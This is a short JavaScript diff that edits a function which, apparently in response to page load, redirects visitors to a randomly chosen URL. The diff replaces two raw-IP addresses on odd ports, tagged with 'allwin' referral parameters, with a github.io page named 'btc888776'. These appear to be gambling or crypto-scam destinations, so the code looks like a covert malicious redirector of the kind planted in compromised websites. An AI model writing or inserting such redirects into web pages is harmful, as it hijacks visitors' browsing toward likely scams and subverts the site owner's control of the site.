@@ -150,8 +150,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
 function jumpUrl(){
   var arr = new Array(
-    "https://156.234.87.109:61106/#/link?allwin=6817108&v=621",
-    "https://45.114.105.123:7788/#/link?allwin=6817108",
+    "https://btc888776.github.io/dh/",
   );
  window.location.href = arr[Math.floor(Math.random() * arr.length)];
 }
